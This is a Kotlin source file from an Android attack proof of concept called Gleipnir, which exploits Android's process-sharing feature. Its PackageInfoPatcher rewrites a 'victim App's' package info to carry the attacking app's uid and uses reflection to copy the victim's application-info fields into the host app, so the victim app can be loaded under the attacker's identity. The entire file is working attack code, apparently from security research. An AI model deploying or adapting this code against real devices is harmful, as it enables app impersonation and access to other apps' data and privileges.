/*
 * Gleipnir Attack POC - Exploiting the Android process share feature
 * Copyright (C) <2020>  <Sascha Roth>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

package org.gleipnir.app.helpers

import android.app.Activity
import android.content.pm.*
import android.os.Bundle
import java.lang.reflect.Modifier

object PackageInfoPatcher {

    /**
     * Patch the given package info representing the victim App.
     *
     * Change application info
     * Change activities package name
     */
    @JvmStatic
    fun patch(hostActivity: Activity, targetPackageInfo: PackageInfo) {
        targetPackageInfo.applicationInfo.uid = hostActivity.applicationInfo.uid // use gleipnir uid
        targetPackageInfo.activities?.forEach {
            patchActivityInfo(
                hostActivity,
                it
            )
        }

        targetPackageInfo.providers?.forEach {
            patchProviderInfo(hostActivity, it)
        }

        targetPackageInfo.services?.forEach {
            patchServiceInfo(hostActivity, it)
        }
        if (targetPackageInfo.applicationInfo.metaData == null) {
            targetPackageInfo.applicationInfo.metaData = Bundle() // prevent nullpointers
        }

        patchHostApplicationInfo(targetPackageInfo.applicationInfo,hostActivity.applicationInfo)
    }

    @JvmStatic
    fun patchActivityInfo(hostActivity: Activity, activityInfo: ActivityInfo) {
        if (activityInfo.metaData == null) {
            activityInfo.metaData = Bundle()
        }
    }

    @JvmStatic
    fun patchProviderInfo(hostActivity: Activity, providerInfo: ProviderInfo) {
        if (providerInfo.metaData == null) {
            providerInfo.metaData = Bundle()
        }
    }

    @JvmStatic
    fun patchServiceInfo(hostActivity: Activity, serviceInfo: ServiceInfo) {
        //serviceInfo.packageName = hostActivity.packageName
        if (serviceInfo.metaData == null) {
            serviceInfo.metaData = Bundle()
        }
    }

    @JvmStatic
    fun patchHostApplicationInfo(
        targetApplicationInfo: ApplicationInfo,
        hostApplicationInfo: ApplicationInfo
    ) {
        targetApplicationInfo::class.java.fields.forEach {
            if (!Modifier.isFinal(it.modifiers)) {
                it.set(hostApplicationInfo, it.get(targetApplicationInfo)) // set target application info to our application info
            }
        }
    }
}